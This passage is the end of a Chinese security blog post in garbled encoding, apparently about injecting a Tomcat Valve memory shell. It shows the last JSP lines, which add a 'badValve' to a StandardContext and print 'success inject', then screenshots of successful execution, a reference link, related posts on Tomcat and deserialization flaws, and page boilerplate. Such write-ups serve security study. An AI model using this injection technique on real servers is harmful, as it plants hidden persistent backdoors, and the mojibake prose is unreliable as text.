</span></span><span class="line"><span class="cl">    standardContext.addValve(badValve);
</span></span><span class="line"><span class="cl">//æç¤ºæ³¨å…¥
</span></span><span class="line"><span class="cl">    out.println(&#34;success inject&#34;);
</span></span><span class="line"><span class="cl">%&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç„¶åå¼€å¯æœåŠ¡å™¨å³å¯ï¼š</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055920.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240904160741535"
	
	
></p>
<p>æˆåŠŸæ‰§è¡Œï¼š</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055064.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240904160812627"
	
	
></p>
<p>å‚è€ƒæ–‡ç« ï¼š</p>
<p><code>https://www.freebuf.com/articles/web/343094.html</code></p>

</section>


    <footer class="article-footer">
    

    
    <section class="article-copyright">
        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
</svg>



        <span>Licensed under CC BY-NC-SA 4.0</span>
    </section>
    </footer>


    
</article>

    

    

<aside class="related-content--wrapper">
    <h2 class="section-title">ç›¸å…³æ–‡ç« </h2>
    <div class="related-content">
        <div class="flex article-list--tile">
            
                
<article class="">
    <a href="/p/tomcat-put%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%92%8Csession-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
        
        

        <div class="article-details">
            <h2 class="article-title">Tomcat PUTæ–‡ä»¶ä¸Šä¼ å’ŒSession ååºåˆ—åŒ–ä»£ç æ‰§è¡Œæ¼æ´åˆ†æ</h2>
        </div>
    </a>
</article>

            
                
<article class="">
    <a href="/p/tomcat%E5%85%B3%E9%94%AE%E7%9F%A5%E8%AF%86%E4%BA%86%E8%A7%A3/">
        
        

        <div class="article-details">
            <h2 class="article-title">Tomcatå…³é”®çŸ¥è¯†äº†è§£</h2>
        </div>
    </a>
</article>

            
                
<article class="">
    <a href="/p/hibernate%E7%BB%84%E4%BB%B6%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">
        
        

        <div class="article-details">
            <h2 class="article-title">hibernateç»„ä»¶çš„ååºåˆ—åŒ–æ¼æ´</h2>
        </div>
    </a>
</article>

            
                
<article class="">
    <a href="/p/jdk17%E4%B8%8B%E7%9A%84%E5%8F%8D%E5%B0%84%E7%BB%95%E8%BF%87/">
        
        

        <div class="article-details">
            <h2 class="article-title">JDK17ä¸‹çš„åå°„ç»•è¿‡</h2>
        </div>
    </a>
</article>

            
                
<article class="">
    <a href="/p/fastjson2%E4%B8%8B%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%B0%83%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/">
        
        

        <div class="article-details">
            <h2 class="article-title">fastjson2ä¸‹çš„ååºåˆ—åŒ–è°ƒç”¨é“¾åˆ†æ</h2>
        </div>
    </a>
</article>

            
        </div>
    </div>
</aside>

     
    
        
    

    <footer class="site-footer">
    <section class="copyright">
        &copy; 
        
            2020 - 
        
        2025 Example Person
    </section>
    
    <section class="powerby">
        ä½¿ç”¨ <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> æ„å»º <br />
        ä¸»é¢˜ <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.29.0">Stack</a></b> ç”± <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> è®¾è®¡
    </section>
</footer>


    
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
            >

            </main>
        </div>
        <script 
                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
                
                >
            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>

    </body>
</html>
